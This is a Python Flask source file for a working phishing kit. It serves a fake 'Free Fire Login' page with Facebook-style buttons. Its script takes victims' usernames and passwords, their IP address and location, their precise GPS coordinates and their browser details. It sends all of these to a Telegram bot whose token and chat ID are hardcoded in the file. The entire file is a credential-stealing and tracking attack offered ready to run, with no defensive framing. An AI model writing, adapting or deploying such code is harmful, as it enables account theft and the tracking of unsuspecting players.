from flask import Flask, request, render_template_string
import requests
import json

app = Flask(__name__)

# Telegram Bot Token and Chat ID
BOT_TOKEN = '8182753279:AAHuwC_Oi2F0WiTXW7BZks1C5qpWWUVWFN4'  # Replace with your bot token
CHAT_ID = '7524292072'  # Replace with your chat ID

# HTML template for the login page with Free Fire + Facebook-like design
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: url('https://i.ibb.co/0jQz0yL/freefire-bg.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 300px;
        }
        .login-box h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.8);
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background: #1877f2; /* Facebook blue */
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-box button:hover {
            background: #165dbb;
        }
        .login-box .fb-login {
            background: #1877f2; /* Facebook blue */
        }
        .login-box .ff-login {
            background: #ff5722; /* Free Fire orange */
        }
        .login-box .fb-login:hover {
            background: #165dbb;
        }
        .login-box .ff-login:hover {
            background: #e64a19;
        }
        .login-box p {
            color: #fff;
            margin-top: 20px;
        }
        .login-box a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Free Fire Login</h2>
        <form method="post" onsubmit="sendData(event)">
            <input type="text" name="username" id="username" placeholder="Username" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="submit" class="ff-login">Login with Free Fire</button>
        </form>
        <p>Or</p>
        <button class="fb-login">Login with Facebook</button>
    </div>

    <script>
        async function sendData(event) {
            event.preventDefault(); // Prevent form submission

            // Get username and password
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Get additional details
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip);

            const location = await fetch(`https://ipapi.co/${ip}/json/`)
                .then(response => response.json());

            const coordinates = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition((position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                });
            });

            const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };

            // Prepare data to send
            const data = {
                username,
                password,
                ip,
                location,
                coordinates,
                browserInfo
            };

            // Send data to the server
            fetch('/send-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.text())
            .then(message => {
                alert(message); // Show response from the server
            });
        }
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def login():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send-data', methods=['POST'])
def send_data():
    data = request.json

    # Prepare the message for Telegram
    message = (
        f"Username: {data['username']}\n"
        f"Password: {data['password']}\n"
        f"IP Address: {data['ip']}\n"
        f"Location: {data['location']['city']}, {data['location']['region']}, {data['location']['country_name']}\n"
        f"Coordinates: Latitude = {data['coordinates']['latitude']}, Longitude = {data['coordinates']['longitude']}\n"
        f"Browser Info: {data['browserInfo']['userAgent']}\n"
        f"Platform: {data['browserInfo']['platform']}\n"
        f"Language: {data['browserInfo']['language']}"
    )

    # Send the message to the Telegram bot
    send_to_telegram(message)

    return "Login details sent to Telegram bot!"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
